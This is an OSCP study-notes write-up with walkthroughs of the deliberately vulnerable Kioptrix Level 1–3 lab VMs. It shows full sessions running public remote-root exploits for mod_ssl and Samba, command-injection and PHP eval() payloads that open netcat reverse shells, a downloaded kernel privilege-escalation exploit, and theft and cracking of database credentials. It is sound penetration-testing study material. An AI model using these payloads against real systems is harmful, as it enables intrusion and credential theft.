# Oscp study

Notes of my Offensive Security Certified Professional (OSCP) study plan. :-)

**Last updated**: 2017-08-05

## OSCP-like VMs:
- Beginner friendly:
	- Kioptrix: Level 1 (#1) [ok]
	- Kioptrix: Level 1.1 (#2) [ok]
	- Kioptrix: Level 1.2 (#3) [ok]
	- Kioptrix: Level 1.3 (#4) [ok]
	- FristiLeaks: 1.3 [ok]
	- Stapler: 1 [ok]
	- PwnLab: init [ok]
- Intermediate:
	- Kioptrix: 2014 [ok]
	- Brainpan: 1 (Part 1 of BO is relevant to OSCP. egghunting is out of scope though)
	- Mr-Robot: 1 [ok] 
	- HackLAB: Vulnix [ok]
 	- Not so sure (Didn't solve them yet):
	- VulnOS: 2
	- SickOs: 1.2
	- /dev/random: scream 
	- pWnOS: 2.0
	- SkyTower: 1 
	- IMF
	- Lord of the Root 1.0.1
	- Tr0ll
	- Pegasus
- Windows 
	- Metasploitable 3
	- /dev/random: Sleepy (Uses VulnInjector, need to provide you own ISO and key.)
	- Bobby: 1 (Uses VulnInjector, need to provide you own ISO and key.)

(credits for **@abatchy**)

## Recommended books:

<a href="https://www.amazon.com.br/Penetration-Testing-Hands-Introduction-Hacking/dp/1593275641">Penetration Testing: A Hands-On Introduction to Hacking</a> (+Highly recommended for beginners)  
<a href="https://www.amazon.com/Hacking-Art-Exploitation-Jon-Erickson/dp/1593271441/ref=sr_1_1?ie=UTF8&qid=1492297164&sr=8-1&keywords=hacking">Hacking: The Art of Exploitation, 2nd Edition</a>  
<a href="https://www.amazon.com/Rtfm-Red-Team-Field-Manual/dp/1494295504/ref=sr_1_2?ie=UTF8&qid=1492297153&sr=8-2&keywords=pentest">Rtfm: Red Team Field Manual</a>  
<a href="https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470/ref=sr_1_1?ie=UTF8&qid=1492297179&sr=8-1&keywords=the+web+application+hacker%27s+handbook">The Web Application Hacker's Handbook: Finding and Exploiting Security Flaws</a>  
<a href="https://www.amazon.com/Hacker-Playbook-Practical-Penetration-Testing-ebook/dp/B00J5S9OPU">The Hacker Playbook: Practical Guide To Penetration Testing</a>

## Links:

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ [+Linux privilege escalation]
http://www.abatchy.com/2017/03/how-to-prepare-for-pwkoscp-noob.html  
https://www.securitysift.com/offsec-pwb-oscp/ [+Scripts]     
http://hackingandsecurity.blogspot.com.br/2016/04/oscp-related-notes.html  
http://rtfm-ctf.org/2017/PWN-PATH-TO-OSCP  
http://www.techexams.net/forums/security-certifications/110760-oscp-jollyfrogs-tale.html [RECOMMENDED]  
https://tulpa-security.com/2016/09/19/prep-guide-for-offsecs-pwk/


## Kioptrix: Level 1

Basic enumeration:

```bash
ferreirasc@roarrr:/$ nmap -sV -sC -sS -p- 192.168.3.96
Starting Nmap 7.40 ( https://nmap.org ) at 2017-04-23 10:12 -03
Nmap scan report for 192.168.3.96
Host is up (0.058s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
111/tcp  open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1           1024/tcp  status
|_  100024  1           1024/udp  status
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
|_ssl-date: 2017-04-23T01:00:04+00:00; -12h12m39s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|_    SSL2_RC4_64_WITH_MD5
1024/tcp open  status      1 (RPC #100024)

Host script results:
|_clock-skew: mean: -12h12m39s, deviation: 0s, median: -12h12m39s
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.80 seconds
```

#### Exploit 1: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Exploit

- Exploit: [exploit-db link](https://www.exploit-db.com/exploits/764/)
- Updated: xpl/openfuck.c (thx for [@paulsec](http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/))

```bash
ferreirasc@roarrr:/$ gcc openfuck.c -L/usr/local/opt/openssl/lib -I/usr/local/opt/openssl/include -lcrypto -o openfuck
ferreirasc@roarrr:/$ ./openfuck 0x6b 192.168.3.96 -c 20
*******************************************************************
* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 20 of 20
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80f8050
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$
 p ptrace-kmod.c; rm ptrace-kmod.c; ./p; 192.168.3.60:8081/ptrace-kmod.c; gcc -o
--21:29:54--  http://192.168.3.60:8081/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to 192.168.3.60:8081...
Connection to 192.168.3.60:8081 refused.
gcc: ptrace-kmod.c: No such file or directory
gcc: No input files
rm: cannot remove `ptrace-kmod.c': No such file or directory
ls
p
payload
payload.py
session_mm.sem
id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
bash -i
[root@kioptrix tmp]#
```
#### Exploit 2: Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow

- Exploit: [exploit-db link](https://www.exploit-db.com/exploits/22470/)
- xpl/trans2open.c

SMB enumeration:

```bash
root@kali:~# enum4linux -a 192.168.3.96
<............ omitted information .........>
 ======================================
|    OS information on 192.168.3.96    |
 ======================================
[+] Got OS info for 192.168.3.96 from smbclient: Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]
[+] Got OS info for 192.168.3.96 from srvinfo:
	KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
	platform_id     :	500
	os version      :	4.5
	server type     :	0x9a03
<............ omitted information .........>
```

Server was running Samba 2.2.1a, vulnerable to trans2open rce exploit. So...

```bash
ferreirasc@roarrr:~$ searchsploit samba 2.2.
----------------------------------------------------------------------------------------------------------- --------------------------------------------------------------------
 Exploit Title                                                                                             |  Path
                                                                                                           | (/usr/local/Cellar/exploitdb/2016-12-24/share/exploitdb/platforms)
----------------------------------------------------------------------------------------------------------- --------------------------------------------------------------------
(Linux Kernel 2.6) Samba 2.2.8 (Debian / Mandrake) - Share Privilege Escalation                            | /linux/local/23674.txt
Samba 2.2.x - Buffer Overflow                                                                              | /linux/remote/7.pl
Samba 2.2.8 - Remote Code Execution                                                                        | /linux/remote/10.c
Samba 2.2.8 - (Brute Force Method) Remote Command Execution                                                | /linux/remote/55.c
Samba 2.2.0 < 2.2.8 (OSX) - trans2open Overflow (Metasploit)                                               | /osx/remote/9924.rb
Samba 2.2.x - nttrans Overflow (Metasploit)                                                                | /linux/remote/9936.rb
Samba 2.2.2 < 2.2.6 - nttrans Buffer Overflow (Metasploit)                                                 | /linux/remote/16321.rb
Samba 2.2.8 (Solaris SPARC) - 'trans2open' Overflow (Metasploit)                                           | /solaris_sparc/remote/16330.rb
Samba 2.2.8 (Linux x86) - 'trans2open' Overflow (Metasploit)                                               | /linux/remote/16861.rb
Samba 2.2.8 (OSX/PPC) - 'trans2open' Overflow (Metasploit)                                                 | /osx_ppc/remote/16876.rb
Samba 2.2.8 (*BSD x86) - 'trans2open' Overflow Exploit (Metasploit)                                        | /linux/remote/16880.rb
Samba SMB 2.2.x - CIFS/9000 Server A.01.x Packet Assembling Buffer Overflow                                | /unix/remote/22356.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (1)                                                 | /unix/remote/22468.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (2)                                                 | /unix/remote/22469.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (3)                                                 | /unix/remote/22470.c
Samba 2.2.x - 'call_trans2open' Remote Buffer Overflow (4)                                                 | /unix/remote/22471.txt
----------------------------------------------------------------------------------------------------------- --------------------------------------------------------------------
ferreirasc@roarrr:~$ gcc /usr/local/Cellar/exploitdb/2016-12-24/share/exploitdb/platforms/unix/remote/22470.c -o transopen
ferreirasc@roarrr:~$ ./transopen 0 192.168.3.96 192.168.3.60
[+] Listen on port: 45295
[+] Connecting back to: [192.168.3.60:45295]
[+] Target: Linux
[+] Connected to [192.168.3.96:139]
[+] Please wait in seconds...!
[+] Yeah, I have a root ....!
------------------------------
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
uid=0(root) gid=0(root) groups=99(nobody)
```
## Kioptrix: Level 1.1 (Level 2)

Having completed Level 1, we will now play Level 2 of the Kioptrix series. This VM can be found at <a href="http://www.kioptrix.com/"/>Kioptrix webpage</a>.

Let's get started scanning my network to discover the Kioptrix 1.1 VM:

```
root@kali:~# nmap -sn 192.168.3.0/24

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-27 17:57 EDT
<-- omitted information -->
Nmap scan report for 192.168.3.98
Host is up (0.0035s latency).
MAC Address: 00:0C:29:57:92:6D (VMware)
<-- omitted information -->
Nmap done: 256 IP addresses (11 hosts up) scanned in 8.61 seconds
```
The 192.168.3.98 address is mapped to Kioptrix 1.1 on my network. We can do a basic enumeration with nmap to verify the services running on this machine:

```
root@kali:~# nmap -sS -Pn -sV --script=default 192.168.3.98

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-27 18:20 EDT
Nmap scan report for 192.168.3.98
Host is up (0.0050s latency).
Not shown: 993 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey:
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2            111/tcp  rpcbind
|   100000  2            111/udp  rpcbind
|   100024  1            643/udp  status
|_  100024  1            646/tcp  status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2017-07-29T12:20:24+00:00; +1d13h59m41s from scanner time.
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods:
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
646/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:57:92:6D (VMware)

Host script results:
|_clock-skew: mean: 1d13h59m40s, deviation: 0s, median: 1d13h59m40s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.47 seconds
```
Let's take a look at the web server running on the port 80:

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image1.png)

It's just a administration login page. Let's try a simple SQL injection trick to bypass the authentication...

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image2.png)

... and I'm in. :-)

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image3.png)

Apparently, the only function of this "Administration page" is to ping an address on my network. If the application can ping a machine from this field, it could also execute other commands. Assuming that the input could be an argument for a system() function, for example, if I'm lucky I could take advantage of this to execute a payload invoking a reverse shell just using a simple ";" to separate two commands in a shell:

```bash
ping 192.168.3.1;nc <my_ip> 4444 -e /bin/sh
```

I setup a listening on port 4444 to handle the connection of nc, but did not work. 

Maybe I need to provide a complete path to netcat binary (nc binary could not be present on the machine or maybe it's directory would not be listed in $PATH). Let's use *whereis* command to discovering your path:

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image4.png)

And now we can find your right path:

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image5.png)

I checked the "-e" option on netcat binary and it was present (just a *"ping 192.168.3.1;/usr/local/bin/nc --help"*)... which saves me a lot of work! hahah

My reverse shell can be invoked right now:

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/Kioptrix_1_1_image6.png)

And here we go...

```bash
root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
192.168.3.98: inverse host lookup failed: Unknown host
connect to [192.168.3.92] from (UNKNOWN) [192.168.3.98] 32770
id
uid=48(apache) gid=48(apache) groups=48(apache)
bash -i
bash: no job control in this shell
bash-3.00$
```

I'm in with the apache user context. From here, I often use <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/"/>this link</a> as a reference for escalation privilege in *nix environments (thx **@g0tm1k**). Checking the *uname -a* command I figure out that the system is running with a vulnerable kernel version (2.6.9-55.EL), what led me to this exploit-db <a href="https://www.exploit-db.com/exploits/9542/"/>link</a>.

I downloaded the code on my local machine and started a simple web server so my VM can get the code:

```bash
ferreirasc@roarrr:/tmp$wget https://www.exploit-db.com/download/9542 -O CVE-2009-2698.c
--2017-07-29 14:00:02--  https://www.exploit-db.com/download/9542
Resolving www.exploit-db.com... 192.124.249.8
Connecting to www.exploit-db.com|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2645 (2.6K) [application/txt]
Saving to: ‘CVE-2009-2698.c’

CVE-2009-2698.c                             100%[===========================================================================================>]   2.58K  --.-KB/s    in 0s

2017-07-29 14:00:03 (61.5 MB/s) - ‘CVE-2009-2698.c’ saved [2645/2645]

ferreirasc@roarrr:/tmp$ls
9542                          com.apple.launchd.8JhFxdQVtO/ com.apple.launchd.au2p9lNFwf/ mysql.sock=
CVE-2009-2698.c               com.apple.launchd.IQnTugcATa/ com.apple.launchd.qWURxTfKJP/ mysql.sock.lock
ferreirasc@roarrr:/tmp$python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...
``` 

Then, let's compile and test this exploit on the machine:

```bash
bash-3.00$ cd /tmp
bash-3.00$ pwd
/tmp
bash-3.00$ wget 192.168.3.95:8080/CVE-2009-2698.c
--09:51:29--  http://192.168.3.95:8080/CVE-2009-2698.c
           => `CVE-2009-2698.c'
Connecting to 192.168.3.95:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2,645 (2.6K) [text/plain]

    0K ..                                                    100%    5.18 MB/s

09:51:29 (5.18 MB/s) - `CVE-2009-2698.c' saved [2645/2645]

bash-3.00$ ls -lah
total 24K
drwxr-xrwx   4 root   root   4.0K Jul 29 09:51 .
drwxr-xr-x  23 root   root   4.0K Jul 29 05:39 ..
-rw-r--r--   1 apache apache 2.6K Jul 29  2017 CVE-2009-2698.c
drwxrwxrwt   2 root   root   4.0K Jul 29 05:40 .font-unix
drwxrwxrwt   2 root   root   4.0K Jul 29 05:39 .ICE-unix
bash-3.00$ gcc --version
gcc (GCC) 3.4.6 20060404 (Red Hat 3.4.6-8)
Copyright (C) 2006 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

bash-3.00$ gcc CVE-2009-2698.c -o CVE-2009-2698
bash-3.00$ ./CVE-2009-2698
sh: no job control in this shell
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
sh-3.00#
```
Congrats, you have **root**! :D

## Kioptrix: Level 1.2 (Level 3)

Let's take a look at the level 3 of Kioptrix series. This level is a little more tricky than previous two. I'll show one of two possible solutions for this challenge and just comment the second solution at the end.

Again, this VM can be found at <a href="http://www.kioptrix.com/"/>Kioptrix webpage</a>. 

Let's get started scanning my network range to discover the Kioptrix level 3 VM:

```bash
root@kali:~# nmap -sn 192.168.3.0/24

Starting Nmap 7.50 ( https://nmap.org ) at 2017-07-28 00:41 EDT
<-- omitted information -->
Nmap scan report for 192.168.3.92
Host is up (-0.20s latency).
MAC Address: 00:0C:29:9C:A7:C9 (VMware)
<-- omitted information -->
Nmap done: 256 IP addresses (7 hosts up) scanned in 31.66 seconds
```
Once I discovered the address of Kioptrix is mapped to "192.168.3.92" on my network, I can enumerate your running services using nmap again:

```bash
root@roarrr:/Users/ferreirasc$nmap -sS -sC -sV -Pn -n 192.168.3.92

Starting Nmap 7.40 ( https://nmap.org ) at 2017-07-29 19:16 -03
Nmap scan report for kioptrix3.com (192.168.3.92)
Host is up (0.0058s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey:
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
MAC Address: 00:0C:29:9C:A7:C9 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.65 seconds
```
Ok, we have two services running: SSH server and a web server listening on port 80 with the HTTP-title "Ligoat Security - Got Goat? Security". Apparently, there is no problem with the service versions. Let's take a look at this webpage:

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/image1_kioptrix3.png)

It's a blog with some posts, including an interesting post that refers to "new lead programmer" called "**loneferret**". This leads me to believe that this one could be a valid username somewhere in the application. Navigating by the website, I discovered a login page revealing that the application could have been built using a **Lotus CMS** (which has multiple vulnerabilities, according to exploit-db :-P ) :

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/image2_kioptrix3.png)

I decided to do a little more enumeration, this time, using *dirb* to fuzzing directories and *wig* to discover details of the web application:

**Dirb:**

```bash
root@kali:~# dirb http://192.168.3.92/ /usr/share/wordlists/dirb/common.txt

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Fri Jul 28 00:48:38 2017
URL_BASE: http://192.168.3.92/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.3.92/ ----
==> DIRECTORY: http://192.168.3.92/cache/
==> DIRECTORY: http://192.168.3.92/core/
+ http://192.168.3.92/data (CODE:403|SIZE:323)
+ http://192.168.3.92/favicon.ico (CODE:200|SIZE:23126)
==> DIRECTORY: http://192.168.3.92/gallery/
+ http://192.168.3.92/index.php (CODE:200|SIZE:1819)
==> DIRECTORY: http://192.168.3.92/modules/
==> DIRECTORY: http://192.168.3.92/phpmyadmin/
+ http://192.168.3.92/server-status (CODE:403|SIZE:332)
==> DIRECTORY: http://192.168.3.92/style/

<----- a lot of omitted informations... ----->
```

**Wig:**

```bash
ferreirasc@roarrr:~/pentest/web/identify-cms/wig$wig http://192.168.3.92/

wig - WebApp Information Gatherer


Scanning http://192.168.3.92/...
___________________________________________ SITE INFO ____________________________________________
IP                              Title
192.168.3.92                    Ligoat Security - Got Goat? Security ...

____________________________________________ VERSION _____________________________________________
Name                            Versions                       Type
phpMyAdmin                      2.11.3                         CMS
Apache                          2.2.8                          Platform
PHP                             5.2.4-2ubuntu5.6               Platform
suhosin-patch                                                  Platform
with                                                           Platform
Ubuntu                          8.04                           OS

__________________________________________ INTERESTING ___________________________________________
URL                             Note                           Type
/phpmyadmin/                    PHPMyAdmin page                Interesting
/phpmyadmin/Documentation.html  phpMyAdmin Documentation page  Interesting

________________________________________ VULNERABILITIES _________________________________________
Affected                        #Vulns                         Link
phpMyAdmin 2.11.3               16                             http://cvedetails.com/version/52820

__________________________________________________________________________________________________
Time: 6.1 sec                   Urls: 412                      Fingerprints: 40401
```

Ok, some listable directories revealing modules, plugins (probably of LotusCMS) and a phpmyadmin 2.11.3 running on backend of application. Good, now we know that a MySQL dbms is running at the VM in localhost.

A quick search on google with the dork "lotuscms exploit-db" reveals a lot of vulnerabilities of this CMS in your 3.0 version. Including an existing exploit in metasploit to take advantage of eval() in the application through of "page" variable on URI **"index.php?page=index"**. I really don't know if the CMS is in your 3.0 version, but it doesn't hurt to try :D

For this walkthrough, I'm going to avoid the metasploit-fu. Searching a little more for this vulnerability on Google, I discovered that the vulnerability (or one of them) is in the php file **core/lib/router.php**:

```php
//If there is a request for a plugin
if(file_exists("core/plugs/".$plugin."Starter.php")){
//Include Page fetcher
	include("core/plugs/".$plugin."Starter.php");
	//Fetch the page and get over loading cache etc...
	eval("new ".$plugin."Starter('".$page."');");
}
```  
The variable "page" is being passed to a eval() call without any sanitization.  We can take advantage of this exploring the page variable and allowing remote code execution (RCE) in the application. If we input " **index');system('id');#** ", this will be passed to the application like:

```php
//If there is a request for a plugin
if(file_exists("core/plugs/".$plugin."Starter.php")){
//Include Page fetcher
    include("core/plugs/".$plugin."Starter.php");
    //Fetch the page and get over loading cache etc...
    eval("new ".$plugin."Starter('index');system('id');#');");
}
```

If the vulnerability is present and if everything works fine, an "id" information will be showed in the page. Let's check it out:

![Alt text](https://raw.githubusercontent.com/ferreirasc/ferreirasc.github.io/master/post/images/image3_kioptrix3.png)

Great! I've a RCE. Time to reverse shell. 

Let's input " **index');system('nc \<attacker_ip\> -e /bin/sh');#** " to connect-back the webapp on my listener:

```bash
root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
192.168.3.92: inverse host lookup failed: Unknown host
connect to [192.168.3.91] from (UNKNOWN) [192.168.3.92] 42590
python -c 'import pty;pty.spawn("/bin/bash");'
www-data@Kioptrix3:/home/www/kioptrix3.com$
```
As seen above, I needed to "upgrade" my shell for a PTY (pseudo-terminal) version using python. This is not at all like a complete and all-powerful TTY, but it helps. You can see more techniques to upgrade simple shells here. Knowing these techniques can be very useful in a pentest.

Now, knowing that the web application communicates with a database in backend, I decided to discover the login and password for access this one. I will recursively search for the string "pass" from this directory using a *grep* command:

```bash
www-data@Kioptrix3:/home/www/kioptrix3.com$ls -lah
total 92K
drwxr-xr-x  8 root root 4.0K 2011-04-15 16:24 .
drwxr-xr-x  3 root root 4.0K 2011-04-12 11:58 ..
drwxrwxrwx  2 root root 4.0K 2011-04-15 09:21 cache
drwxrwxrwx  8 root root 4.0K 2011-04-14 12:23 core
drwxrwxrwx  8 root root 4.0K 2011-04-14 12:23 data
-rw-r--r--  1 root root  23K 2009-06-05 15:22 favicon.ico
drwxr-xr-x  7 root root 4.0K 2011-04-14 11:32 gallery
-rw-r--r--  1 root root  26K 2007-01-21 18:36 gnu-lgpl.txt
-rw-r--r--  1 root root  399 2011-02-23 13:29 index.php
drwxrwxrwx 10 root root 4.0K 2011-04-14 12:23 modules
drwxrwxrwx  3 root root 4.0K 2011-04-14 12:23 style
-rw-r--r--  1 root root  243 2010-08-05 19:39 update.php

www-data@Kioptrix3:/home/www/kioptrix3.com$grep -ir "pass" .
<--- a lot of omitted information --->
grep: ./gallery/scopbin/911006.php.save: Permission denied
./gallery/gconfig.php:	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
./gallery/gconfig.php:if(!$g_mysql_c = @mysql_connect($GLOBALS["gallarific_mysql_server"], $GLOBALS["gallarific_mysql_username"], $GLOBALS["gallarific_mysql_password"])) {
<--- a lot of omitted information --->

www-data@Kioptrix3:/home/www/kioptrix3.com$cat gallery/gconfig.php
<--- a lot of omitted information --->
// Installer Details -----------------------------------------------

	// Enter the full HTTP path to your Gallarific folder below,
	// such as http://www.yoursite.com/gallery
	// Do NOT include a trailing forward slash

	$GLOBALS["gallarific_path"] = "http://kioptrix3.com/gallery";

	$GLOBALS["gallarific_mysql_server"] = "localhost";
	$GLOBALS["gallarific_mysql_database"] = "gallery";
	$GLOBALS["gallarific_mysql_username"] = "root";
	$GLOBALS["gallarific_mysql_password"] = "fuckeyou";
<--- a lot of omitted information --->
```  
Ok, now we have root access on "gallery" database with the password "fuckeyou" (lol). Let's try to connect:

```bash
www-data@Kioptrix3:/home/www/kioptrix3.com$mysql -u root -D gallery -p
Enter password:
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show tables;
+----------------------+
| Tables_in_gallery    |
+----------------------+
| dev_accounts         |
| gallarific_comments  |
| gallarific_galleries |
| gallarific_photos    |
| gallarific_settings  |
| gallarific_stats     |
| gallarific_users     |
+----------------------+
7 rows in set (0.00 sec)

mysql>select * from dev_accounts;
+----+------------+----------------------------------+
| id | username   | password                         |
+----+------------+----------------------------------+
|  1 | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 |
|  2 | loneferret | 5badcaf789d3d1d09794d8f021f40f0e |
+----+------------+----------------------------------+
2 rows in set (0.01 sec)
```
The gallery database has two developer accounts: "dreg" and "lone ferret" (remember him?). Let's see if john can crack these hashes:

```bash
ferreirasc@roarrr:~$echo -e 'dreg:0d3eccfb887aabd50f243b3f155c0f85\x10loneferret:5badcaf789d3d1d09794d8f021f40f0e' > /tmp/hashes
ferreirasc@roarrr:~$john /tmp/hashes --format=raw-md5
Created directory: /Users/ferreirasc/.john
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 SSSE3 20x])
Press 'q' or Ctrl-C to abort, almost any other key for status
starwars         (loneferret)
1g 0:00:00:36  3/3 0.02712g/s 7830Kp/s 7830Kc/s 7830KC/s bkrkki..bkrk50
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

John was able to crack the "loneferret" password (**starwars**), but took a lot of time to try breaking "dreg" password. No problem, Google told me that your password is "**Mast3r**". Looking at the file "/etc/passwd", I figured out that the system also has "loneferret" and "dreg" as users, maybe they use the same password on it. Let's try logging onto the server as loneferret using ssh:

```bash
ferreirasc@roarrr:~$ssh loneferret@192.168.3.92
loneferret@192.168.3.93's password:
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Sun Jul 30 15:38:15 2017 from 192.168.3.27
loneferret@Kioptrix3:~$id
uid=1000(loneferret) gid=100(users) groups=100(users)
```
